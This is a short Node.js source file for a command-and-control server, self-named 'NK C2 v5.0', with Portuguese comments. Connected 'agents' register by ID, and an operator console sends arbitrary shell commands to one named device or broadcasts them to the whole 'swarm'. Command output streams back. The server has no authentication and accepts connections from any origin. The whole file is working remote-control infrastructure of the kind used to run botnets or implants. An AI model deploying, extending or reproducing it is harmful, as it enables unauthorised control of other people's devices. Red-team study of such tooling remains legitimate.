const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 });

app.use(cors());

let agents = new Map();

io.on('connection', (socket) => {
    // 1. Identificação
    socket.on('identify', ({ type, id }) => {
        if (type === 'agent') {
            agents.set(id, socket.id);
            console.log(`[AGENT] ${id} Connected`);
            io.emit('log', `[SYSTEM] NEW AGENT: ${id}`);
        } else {
            console.log('[UI] Console Connected');
        }
    });

    // 2. Comandos (UI -> Agent)
    socket.on('cmd', (data) => {
        // Suporte a alvo especifico: "@iphone ls -la"
        const cmd = data.cmd;
        if (cmd.startsWith('@')) {
            const parts = cmd.split(' ');
            const targetId = parts[0].substring(1);
            const actualCmd = parts.slice(1).join(' ');
            const targetSocket = agents.get(targetId);
            
            if (targetSocket) {
                io.to(targetSocket).emit('exec', { cmd: actualCmd });
                io.emit('log', `[CMD] Sent to ${targetId}: ${actualCmd}`);
            } else {
                io.emit('log', `[ERR] Target ${targetId} not found.`);
            }
        } else {
            // Broadcast para todos (padrão Swarm)
            io.emit('exec', data);
        }
    });

    // 3. Logs (Agent -> UI)
    socket.on('stream_log', (data) => {
        io.emit('log', `[${data.from}] ${data.output}`);
    });

    socket.on('disconnect', () => {
        // Cleanup agent list logic here if needed
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`NK C2 v5.0 running on port ${PORT}`));